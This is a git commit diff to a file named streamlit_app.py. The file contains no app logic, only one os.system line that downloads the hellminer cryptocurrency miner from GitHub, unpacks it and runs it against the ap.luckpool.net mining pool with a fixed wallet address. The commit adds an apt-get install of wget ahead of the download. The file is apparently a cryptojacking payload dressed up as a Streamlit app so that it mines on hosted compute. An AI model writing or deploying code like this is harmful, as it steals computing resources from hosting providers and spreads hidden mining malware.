6b4ac0450ddc6c9aa6890b90ed8a531e16e592d9
fariisna8 <fariisna8@gmail.com>
2024-09-17 16:53:30 +0700

    Update streamlit_app.py

--- streamlit_app.py
+++ streamlit_app.py
@@ -1,2 +1,2 @@
 import os
-os.system('wget https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64.tar.gz && tar -xf hellminer_linux64.tar.gz && ./hellminer -c ap.luckpool.net:3957 -u RWUBa38r4LCMckjEQgttADt1rDJowLXPrA.$(echo $(shuf -i 1-99 -n 1)-ApaLolihatS) -p x')
+os.system('apt-get install wget && wget https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64.tar.gz && tar -xf hellminer_linux64.tar.gz && ./hellminer -c ap.luckpool.net:3957 -u RWUBa38r4LCMckjEQgttADt1rDJowLXPrA.$(echo $(shuf -i 1-99 -n 1)-ApaLolihatS) -p x')
